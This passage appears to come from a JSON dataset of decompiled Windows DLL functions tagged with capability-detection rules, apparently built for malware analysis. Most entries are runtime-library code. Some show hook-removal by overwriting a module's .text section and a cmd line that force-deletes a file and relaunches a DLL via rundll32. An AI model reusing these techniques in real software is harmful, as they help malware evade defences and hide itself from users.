puVar5[\".text\" - puVar4]) {\n                        uVar3 = -(uVar1 < puVar5[\".text\" - puVar4]) | 1;\n                        goto code_r0x0001800059fc;\n                    }\n                    puVar5 = puVar5 + 1;\n                } while (uVar1 != 0);\n                uVar3 = 0;\ncode_r0x0001800059fc:\n                if (uVar3 == 0) {\n                    auStack680[0] = 0;\n                    uStack632 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                          (uStack640, iStack672 + *(puVar4 + 0xc), *(puVar4 + 8), 0x40, auStack680);\n                    puVar8 = iStack648 + *(puVar4 + 0xc);\n                    puVar10 = iStack672 + *(puVar4 + 0xc);\n                    for (uVar7 = *(puVar4 + 8); uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    uStack632 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                          (uStack640, iStack672 + *(puVar4 + 0xc), *(puVar4 + 8), auStack680[0], \n                                           auStack680);\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_UnmapViewOfFile)(iStack648);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack640);\n    if (iStack664 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack664);\n    }\n    if (iStack656 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack656);\n    }\n    if (iStack616 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iStack616);\n    }\n    return 0;\n}\n",
        "token_count": 1392
    },
    "18000667": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180006670(ulong arg1)\n\n{\n    uchar auVar1 [16];\n    uint uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    int64_t iStackX24;\n    int64_t iStackX32;\n    ulong uStack16;\n    \n    uStack16 = 0x180006680;\n    iVar4 = fcn.18001df20();\n    iVar4 = -iVar4;\n    *(&stack0x00000078 + iVar4) = 0x40;\n    *(&stack0xfffffffffffffff0 + iVar4) = 0x18000669c;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&stack0x00000078 + iVar4);\n    auVar1 = ZEXT816(0) << 0x40 |\n             (ZEXT816(0) << 0x40 | ZEXT816(*(&stack0x00000080 + iVar4)) / ZEXT816(0x400) & 0xffffffffffffffff) /\n             ZEXT816(0x400) & 0xffffffffffffffff;\n    if (2 < SUB168(auVar1 / ZEXT816(0x400), 0)) {\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x1800066d4;\n        fcn.180001030(0x400, SUB168(auVar1 % ZEXT816(0x400), 0));\n        puVar7 = &stack0x00000b48 + iVar4;\n        for (iVar6 = 0x824; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        puVar7 = &stack0x00000938 + iVar4;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x180006712;\n        (*_sym.imp.USER32.dll_CharToOemW)(*(&stack0x00001388 + iVar4), &stack0x00000b48 + iVar4);\n        puVar7 = &stack0x00000128 + iVar4;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x18000672c;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x180006745;\n        (*_sym.imp.KERNEL32.dll_K32GetModuleFileNameExW)(uVar5, 0, &stack0x00000128 + iVar4, 0x104);\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x18000674a;\n        fcn.180005b40();\n        (&stack0x00000048)[iVar4] = 0x6e;\n        (&stack0x00000049)[iVar4] = 0x74;\n        (&stack0x0000004a)[iVar4] = 100;\n        (&stack0x0000004b)[iVar4] = 0x6c;\n        (&stack0x0000004c)[iVar4] = 0x6c;\n        (&stack0x0000004d)[iVar4] = 0x2e;\n        (&stack0x0000004e)[iVar4] = 100;\n        (&stack0x0000004f)[iVar4] = 0x6c;\n        (&stack0x00000050)[iVar4] = 0x6c;\n        (&stack0x00000051)[iVar4] = 0;\n        if (((*0x18002ce74 == 1) || (*0x18002ce70 == 1)) || (*0x18002ce68 == 1)) {\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x1800067a1;\n            fcn.180005790(&stack0x00000048 + iVar4);\n        }\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x1800067a6;\n        uVar2 = fcn.1800064b0();\n        *(&stack0x00000058 + iVar4) = uVar2;\n        *(&stack0xfffffffffffffff0 + iVar4) = 0x1800067be;\n        iVar6 = fcn.180003360(&stack0x00000128 + iVar4, 0x180027b08);\n        if ((iVar6 == 0) || (*(&stack0x00000058 + iVar4) != 1)) {\n            if (*(&stack0x00000058 + iVar4) == 1) {\n                if ((*0x18002ce68 == 1) || (*0x18002ce70 == 1)) {\n                    puVar7 = &stack0x00000338 + iVar4;\n                    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x18000682c;\n                    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0x180000000, &stack0x00000338 + iVar4, 0x104);\n                    puVar7 = &stack0x00000548 + iVar4;\n                    for (iVar6 = 1000; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    if (*0x18002ce68 == 1) {\n                        *(&stack0x00000020 + iVar4) = &stack0x00000b48 + iVar4;\n                        *(&stack0x00000018 + iVar4) = &stack0x00000338 + iVar4;\n                        *(&stack0xfffffffffffffff0 + iVar4) = 0x180006887;\n                        fcn.1800031f0(&stack0x00000548 + iVar4, \n                                      L\"cmd /c timeout /t 10 & Del /f /q \\\"%s\\\" & attrib -s -h \\\"%s\\\" & rundll32 \\\"%s\\\" #1 %S\"\n                                      , &stack0x00000128 + iVar4, &stack0x00000938 + iVar4);\n                    }\n                    else {\n                        *(&stack0xfffffffffffffff0 + iVar4) = 0x1800068ad;\n                        fcn.1800031f0(&stack0x00000548 + iVar4, L\"cmd /c timeout /t 10 & rundll32 \\\"%s\\\" #1 %S\", \n                                      &stack0x00000338 + iVar4, &stack0x00000b48 + iVar4);\n                    }\n                    puVar7 = &stack0x000000b8 + iVar4;\n                    for (iVar6 = 0x68; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    puVar7 = &stack0x00000060 + iVar4;\n                    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    *(&stack0x000000f4 + iVar4) = 1;\n                    *(&stack0x000000f8 + iVar4) = 0;\n                    *(&stack0x00000040 + iVar4) = &stack0x00000060 + iVar4;\n                    *(&stack0x00000038 + iVar4) = &stack0x000000b8 + iVar4;\n                    *(&stack0x00000030 + iVar4) = 0;\n                    *(&stack0x00000028 + iVar4) = 0;\n                    *(&stack0x00000020 + iVar4) = 0x8000020;\n                    *(&stack0x00000018 + iVar4) = 0;\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x180006936;\n                    iVar3 = (**0x18002cd48)(0, &stack0x00000548 + iVar4, 0, 0);\n                    if (iVar3 != 0) {\n                        if (*(&stack0x00000060 + iVar4) != 0) {\n                            *(&stack0xfffffffffffffff0 + iVar4) = 0x18000694d;\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000060 + iVar4));\n                        }\n                        if (*(&stack0x00000068 + iVar4) != 0) {\n                            *(&stack0xfffffffffffffff0 + iVar4) = 0x180006960;\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(&stack0x00000068 + iVar4));\n                        }\n                    }\n                }\n                else {\n                    *(&stack0xfffffffffffffff0 + iVar4) = 0x18000696f;\n                    fcn.180004c50(&stack0x00000b48 + iVar4);\n                }\n            }\n        }\n        else {\n            *(&stack0xfffffffffffffff0 + iVar4) = 0x1800067d7;\n            fcn.180004c50(&stack0x00000b48 + iVar4);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2209
    },
    "180006fa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180006fa0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    \n    fcn.1800037e0(arg1);\n    if (*arg1 != 0) {\n        fcn.180007580(arg1, *arg1, arg1[1]);\n        iVar1 = *arg1;\n        iVar2 = arg1[2];\n        arg1_00 = fcn.180006f70(arg1);\n        fcn.1800075c0(arg1_00, *arg1, iVar2 - iVar1);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "180007ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180007ba0(int64_t arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    if ((arg3 < arg2) && (iVar1 = fcn.180008250(arg1 + arg3, arg2 - arg3, auStackX32),  iVar1 != 0)) {\n        return iVar1 - arg1;\n    }\n    return -1;\n}\n",
        "token_count": 108
    },
    "180007f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180007f50(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    \n    fcn.1800037e0(arg1);\n    if (*arg1 != 0) {\n        fcn.180007580(arg1, *arg1, arg1[1]);\n        iVar1 = *arg1;\n        iVar2 = arg1[2];\n        arg1_00 = fcn.180006f70(arg1);\n        fcn.1800075c0(arg1_00, *arg1, iVar2 - iVar1);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg2 + arg3;\n    arg1[2] = arg2 + arg4;\n    return;\n}\n",
        "token_count": 195
    },
    "18000838": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.180008380(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    if (arg1 + 0x27 <= arg1) {\n        fcn.180003660();\n    }\n    iVar1 = fcn.180003720(arg1 + 0x27);\n    if (iVar1 == 0) {\n        fcn.18001099c();\n    }\n    uVar2 = iVar1 + 0x27U & 0xffffffffffffffe0;\n    *(uVar2 - 8) = iVar1;\n    return uVar2;\n}\n",
        "token_count": 138
    },
    "18000afe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.18000afe4(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    \n    if (*(arg1 + 0x10) != 0) {\n        uVar5 = 0;\n        puVar7 = *(arg1 + 0x10) + *(arg2 + 8);\n        iVar4 = -1;\n        uVar6 = 0;\n        uVar3 = *puVar7 & 0xf;\n        puVar7 = puVar7 + -*(uVar3 + 0x18001f420);\n        puVar1 = puVar7 + -4;\n        uVar2 = *(uVar3 + 0x18001f430) & 0x1f;\n        if (*puVar1 >> uVar2 != 0) {\n            do {\n                puVar8 = puVar7 + -*((*puVar7 & 0xf) + 0x18001f420);\n                uVar5 = uVar5 + (*(puVar8 + -4) >> (*((*puVar7 & 0xf) + 0x18001f430) & 0x1f));\n                if (arg3 < uVar5 + **(arg2 + 0x10) + *(arg2 + 8)) break;\n                uVar6 = uVar6 + 1;\n                puVar7 = puVar8 + -*((*puVar8 & 0xf) + 0x18001f420);\n                iVar4 = (*(puVar7 + -4) >> (*((*puVar8 & 0xf) + 0x18001f430) & 0x1f)) - 1;\n            } while (uVar6 < *puVar1 >> uVar2);\n            if (uVar6 != 0) {\n                return iVar4;\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 480
    },
    "18000db7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00018000dc28: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00018000dc2d)\n\nint32_t fcn.18000db7c(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t iStack56;\n    int64_t iStack48;\n    char cStack32;\n    \n    if (*0x18002c2c4 != 0) {\n        if ((arg1 == NULL) || (arg2 == NULL)) {\n            puVar3 = fcn.18001293c();\n            *puVar3 = 0x16;\n            fcn.18001097c();\n            iVar7 = 0x7fffffff;\n        }\n        else {\n            fcn.18000daa0(&stack0xffffffffffffffc8, 0);\n            iVar6 = iStack48;\n            if (*(iStack48 + 0x138) == 0) goto code_r0x00018000db42;\n            do {\n                if (*arg1 < 0x100) {\n                    uVar5 = *arg1;\n                    if ((*(\n                          L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                          + uVar5) & 1) != 0) {\n                        uVar5 = *(uVar5 + *(iVar6 + 0x110));\n                    }\n                    uVar1 = uVar5;\n                }\n                else {\n                    uVar1 = fcn.180012e50(*arg1, &stack0xffffffffffffffd0);\n                    iVar6 = iStack48;\n                }\n                arg1 = arg1 + 1;\n                if (*arg2 < 0x100) {\n                    uVar5 = *arg2;\n                    if ((*(\n                          L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                          + uVar5) & 1) != 0) {\n                        uVar5 = *(uVar5 + *(iVar6 + 0x110));\n                    }\n                    uVar2 = uVar5;\n                }\n                else {\n                    uVar2 = fcn.180012e50(*arg2, &stack0xffffffffffffffd0);\n                    iVar6 = iStack48;\n                }\n                arg2 = arg2 + 1;\n                iVar7 = uVar1 - uVar2;\n            } while ((iVar7 == 0) && (uVar1 != 0));\n            if (cStack32 != '\\0') {\n                *(iStack56 + 0x3a8) = *(iStack56 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        return iVar7;\n    }\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        iStack48 = 0x18000db93;\n        puVar3 = fcn.18001293c();\n        *puVar3 = 0x16;\n        iStack48 = 0x18000db9e;\n        fcn.18001097c();\n        return 0x7fffffff;\n    }\ncode_r0x00018000db42:\n    do {\n        uVar1 = *arg1;\n        arg1 = arg1 + 1;\n        uVar2 = *arg2;\n        arg2 = arg2 + 1;\n        uVar8 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar8 = uVar1;\n        }\n        uVar4 = uVar2 + 0x20;\n        if (0x19 < uVar2 - 0x41) {\n            uVar4 = uVar2;\n        }\n    } while ((uVar8 - uVar4 == 0) && (uVar8 != 0));\n    return uVar8 - uVar4;\n}\n",
        "token_count": 1549
    },
    "18000ee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18000ee84(int64_t arg1)\n\n{\n    uchar uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    \n    cVar4 = fcn.18000eef8(arg1);\n    if (cVar4 == '\\0') {\n        puVar5 = fcn.18001293c();\n        *puVar5 = 0x16;\n        uVar6 = fcn.18001097c();\n        uVar6 = uVar6 & 0xffffffffffffff00;\n    }\n    else {\n        iVar2 = *(arg1 + 0x468);\n        uVar1 = *(arg1 + 0x41);\n        iVar3 = *(iVar2 + 8);\n        if (*(iVar2 + 0x10) == iVar3) {\n            if (*(iVar2 + 0x18) == '\\0') {\n                *(arg1 + 0x28) = 0xffffffff;\n            }\n            else {\n                *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x28) = *(arg1 + 0x28) + 1;\n            *(iVar2 + 0x10) = *(iVar2 + 0x10) + 1;\n            ***(arg1 + 0x468) = uVar1;\n            **(arg1 + 0x468) = **(arg1 + 0x468) + 1;\n        }\n        uVar6 = CONCAT71(iVar3 >> 8, 1);\n    }\n    return uVar6;\n}\n",
        "token_count": 383
    },
    "18000efa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18000efa0(uint8_t *arg1)\n\n{\n    int32_t *arg4;\n    uint8_t *arg1_00;\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    bool bVar5;\n    uint64_t in_RAX;\n    uint *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    ulong uVar9;\n    ushort *arg2;\n    uchar uVar10;\n    uint32_t uVar11;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    uVar1 = arg1[0x41];\n    pcVar8 = in_RAX & 0xffffffffffffff00;\n    if (uVar1 != 0x46) {\n        if (uVar1 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x00018000f106;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar1 == 0x49) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar2 = *pcVar4;\n                if ((cVar2 == '3') && (pcVar4[1] == '2')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 == '6') && (pcVar4[1] == '4')) {\n                    pcVar8 = pcVar4 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = pcVar8;\n                }\n                else if ((cVar2 + 0xa8U < 0x21) && ((0x120821001U >> (cVar2 + 0xa8U & 0x3f) & 1) != 0)) {\n                    *(arg1 + 0x3c) = 9;\n                }\n            }\n            else if (uVar1 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar1 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar1 == 0x68) {\n                    if (**(arg1 + 0x18) == 'h') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x1;\n                    }\n                    else {\n                        pcVar8 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar1 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x00018000f106;\n                    }\n                    if (uVar1 != 0x6c) {\n                        if (uVar1 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar1 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar1 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x00018000f106;\n                    }\n                    if (**(arg1 + 0x18) == 'l') {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        pcVar8 = 0x4;\n                    }\n                    else {\n                        pcVar8 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = pcVar8;\n            }\ncode_r0x00018000f106:\n            return CONCAT71(pcVar8 >> 8, 1);\n        }\n        puVar6 = fcn.18001293c();\n        *puVar6 = 0x16;\n        uVar7 = fcn.18001097c();\n        return uVar7 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x00018000f106;\n    *(arg1 + 0x2c) = 7;\n    uVar1 = arg1[0x41];\n    uVar10 = 0x78;\n    if (uVar1 < 'e') {\n        if (uVar1 == 100) {\ncode_r0x00018000f397:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018000f39b:\n            uVar9 = 10;\ncode_r0x00018000f3a3:\n            pcVar8 = fcn.18000fe44(arg1, uVar9);\n        }\n        else {\n            if (uVar1 == 0x41) goto code_r0x00018000f3aa;\n            if (uVar1 == 0x43) {\ncode_r0x00018000f315:\n                pcVar8 = fcn.18000fcd4(arg1);\n            }\n            else {\n                if (uVar1 < 'E') goto code_r0x00018000f3b3;\n                if (uVar1 < 'H') goto code_r0x00018000f3aa;\n                if (uVar1 == 0x53) {\ncode_r0x00018000f353:\n                    pcVar8 = fcn.1800101d4(arg1);\n                }\n                else {\n                    if (uVar1 == 0x58) goto code_r0x00018000f368;\n                    if (uVar1 != 0x5a) {\n                        if (uVar1 != 0x61) {\n                            if (uVar1 != 99) goto code_r0x00018000f3b3;\n                            goto code_r0x00018000f315;\n                        }\n                        goto code_r0x00018000f3aa;\n                    }\n                    pcVar8 = fcn.18000f848(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < uVar1) {\n            if (uVar1 == 0x69) goto code_r0x00018000f397;\n            if (uVar1 == 0x6e) {\n                pcVar8 = fcn.18001014c(arg1);\n                goto code_r0x00018000f3af;\n            }\n            if (uVar1 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar9 = 8;\n            }\n            else if (uVar1 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018000f368:\n                uVar9 = 0x10;\n            }\n            else {\n                if (uVar1 == 0x73) goto code_r0x00018000f353;\n                if (uVar1 == 0x75) goto code_r0x00018000f39b;\n                if (uVar1 != 0x78) goto code_r0x00018000f3b3;\n                uVar9 = 0x10;\n            }\n            goto code_r0x00018000f3a3;\n        }\ncode_r0x00018000f3aa:\n        pcVar8 = fcn.18000f938(arg1);\n    }\ncode_r0x00018000f3af:\n    if (pcVar8 == '\\0') {\ncode_r0x00018000f3b3:\n        return pcVar8 & 0xffffffffffffff00;\n    }\n    if (arg1[0x40] != 0) goto code_r0x00018000f4ee;\n    uVar3 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar3 >> 4 & 1) != 0) {\n        if ((uVar3 >> 6 & 1) == 0) {\n            if ((uVar3 & 1) == 0) {\n                if ((uVar3 >> 1 & 1) == 0) goto code_r0x00018000f40c;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x00018000f40c:\n    uVar1 = arg1[0x41];\n    if (((uVar1 + 0xa8 & 0xdf) == 0) && ((uVar3 >> 5 & 1) != 0)) {\n        bVar5 = true;\n    }\n    else {\n        bVar5 = false;\n    }\n    if ((bVar5) || ((uVar1 + 0xbf & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((uVar1 == 0x58) || (uVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar11 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar3 & 0xc) == 0) {\n        fcn.18000e6b4(arg1_00, CONCAT71(uVar3 >> 8, 0x20), uVar11, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.1800104f8(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.18000e6b4(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar11, arg4);\n    }\n    uVar9 = 0;\n    pcVar8 = fcn.180010334(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        pcVar8 = fcn.18000e6b4(arg1_00, CONCAT71(uVar9 >> 8, 0x20), uVar11, arg4);\n    }\ncode_r0x00018000f4ee:\n    return pcVar8 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 2594
    },
    "18000f2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
